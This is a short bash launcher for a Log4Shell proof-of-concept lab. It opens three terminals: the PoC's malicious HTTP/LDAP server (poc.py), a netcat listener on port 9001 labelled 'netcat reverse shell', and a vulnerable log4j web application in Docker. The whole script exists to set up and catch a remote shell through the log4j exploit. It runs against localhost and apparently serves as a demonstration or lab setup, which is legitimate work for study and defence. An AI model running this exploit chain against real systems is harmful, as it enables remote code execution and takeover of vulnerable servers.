#! /bin/bash

POC_PATH="./log4shell-poc/"

xterm -title "HTTP LDAP Server" -e "cd $POC_PATH && python3 poc.py --userip localhost --webport 8000 --lport 9001" &

xterm -title "netcat reverse shell" -e "cd $POC_PATH && nc -lvnp 9001" &

xterm -title "web application (docker)" -e "cd $POC_PATH && docker run --network host log4j-shell-poc" &

